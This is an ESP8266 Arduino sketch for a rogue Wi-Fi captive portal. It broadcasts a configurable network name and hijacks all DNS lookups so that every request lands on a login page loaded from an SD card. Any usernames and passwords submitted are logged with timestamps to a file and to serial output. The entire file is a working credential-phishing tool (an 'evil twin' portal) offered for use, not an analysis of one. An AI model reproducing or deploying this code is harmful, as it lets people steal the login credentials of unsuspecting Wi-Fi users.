#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <String>
#include <SPI.h>
#include <SD.h>
#include <Dictionary.h>

/* 
Made by Matheus Eduardo
MIT License
READ THE DOCS!!!
https://github.com/euMts/Sickomode

Last update: 01/05/2022
Version: 1.0
*/

const byte DNS_PORT = 53;
IPAddress apIP(8, 8, 8, 8);
DNSServer dnsServer;
ESP8266WebServer webServer(80);
File root;

const String defaultHtml = "<!DOCTYPE html>"
                            "<html lang='en'>"
                            "<head>"
                                "<meta name='viewport' content='width=device-width'>"
                                "<title>CaptivePortal</title>"
                            "</head>"
                            "<style>"
                                "body {"
                                    "background-color: hsl(0, 0%, 5%);"
                                    "font-family: sans-serif;"
                                "}"
                                "h1, h3, h4 {"
                                    "color: hsl(0, 0%, 95%);"
                                    "margin:10px;"
                                    "font-weight: 400;"
                                "}"
                                ".myDiv {"
                                    "display: flex;"
                                    "text-align: center;"
                                    "justify-content: center;"
                                    "flex-flow: column;"
                                    "margin-top: 10vh;"
                                "}"
                                "label {"
                                "margin-bottom: 10px;"
                                "}"
                                "input {"
                                "background-color: hsl(0, 0%, 95%);"
                                "padding: 12px 20px;"
                                "margin: 8px 0;"
                                "box-sizing: border-box;"
                                "border-radius: 6px;"
                                "border: none;"
                                "}"
                                ".button{"
                                    "border-radius: 8px;"
                                    "background-color: hsl(0, 0%, 70%);"
                                    "color: #000;"
                                    "font-size: 20px;"
                                    "font-weight: 600;"
                                    "padding: 10px 20px;"
                                    "transition-duration: 0.4s;"
                                    "border: none;"
                                "}"
                                ".button:hover {"
                                    "background-color: hsl(0, 0%, 100%);"
                                "}"
                            "</style>"
                            "<body>"
                                "<div class='myDiv'>"
                                    "<h1 style='font-size: 50px'>Hello</h1>"
                                    "<h4 style='font-size: 30px'>This is a captive portal example.</h4>"
                                    "<h4 style='color:hsl(0, 0%, 100%); font-size: 18px;'>Your information will be sent to the owner of this page.</h4><br>"
                                    "<form action='/login' method='POST'>"
                                        "<label>"
                                            "<h3 style='font-size: 20px'>Username</h3>"
                                            "<input type='text' name='username'><br>"
                                        "</label>"
                                        "<label>"
                                            "<h3 style='font-size: 20px'>Password</h3>"
                                            "<input type='password' name='password'><br>"
                                        "</label>"
                                        "<input type='hidden' name='date' id='date'><br>"
                                        "<input type='submit' value='Submit' onclick='getTime()' class='button'>"
                                    "</form>"
                                "</div>"
                                "<script>"
                                    "function getTime() {"
                                        "return document.getElementById('date').value = new Date().toLocaleString();"
                                    "}"
                                "</script>"
                            "</body>"
                            "</html>";

void setup() {
  //delay(15000);
  Serial.begin(9600);
  while(!SD.begin(SS)){
      // Wait for the sd to begin.
    }
  root = SD.open("/");
  String cfgStr = read_archive("config.json");
  Dictionary cfgJson = read_json(cfgStr);
  String ssid = cfgJson["ssid"];
  String page = cfgJson["page"];
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(ssid);

  // If dns server is started with "*" for domain name, it will reply with provided IP to all DNS request
  dnsServer.start(DNS_PORT, "*", apIP);

  // reply to all requests with same HTML
  webServer.onNotFound([page]() {
    webServer.send(200, "text/html", read_html(page));
  });
  webServer.on("/login", HTTP_POST, handleLogin); //handle requests to '/login'
  webServer.begin();
}

// Read the html file, return default if not found
String read_html(String arq) { // Ex. read_html("pages/index.html")
  File myFile = SD.open(arq);
  String content;
  if (myFile) {
      while (myFile.available()){
        char myChar = myFile.read();
        content += myChar;
      }
      myFile.close();
      }
  else { // File not found
      Serial.println("read_html failed");
      content = defaultHtml; // default value
      }
  return content;      
}

// Read the html file, return default if not found
String read_archive(String arq){ // Ex. read_archive("config.json")
  File myFile = SD.open(arq);
  String content;
  if (myFile) {
      while (myFile.available()){
        char myChar = myFile.read();
        content += myChar;
      }
      myFile.close();
      }
  else { // File not found
      Serial.println("read_archive failed");
      content = ("{\"ssid\":\"Captive Portal\",\"page\":\"pages/index.html\"}"); // default value
      }
  return content;    
}

// Convert string to dict
Dictionary read_json(String content){ // Ex. read_json("{\"username\":\"Matheus\"}")
  Dictionary *dict = new Dictionary();
  dict->jload(content);
  return *dict; // Return the pointer
}

// Save the content into a text file
void write_archive(String arq, String content) { // Ex. write_archive("myFile.txt", "some text");
    File myFile = SD.open(arq, FILE_WRITE);
    if (myFile) {
        myFile.print("\n" + content);
        myFile.close();
        }
    else {
        Serial.println("write_archive failed");
        }
}

// Handle the post requests to /login
void handleLogin() {
    String user = webServer.arg("username");
    String password = webServer.arg("password");
    String currentDate = webServer.arg("date");
    Serial.println("User: " + user);
    Serial.println("Password: " + password);
    Serial.println("Time: " + currentDate);
    String data = ("[" + currentDate +"] ==> User: '" + user + "' - Password: '" + password + "'");
    write_archive("data.txt", data);
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}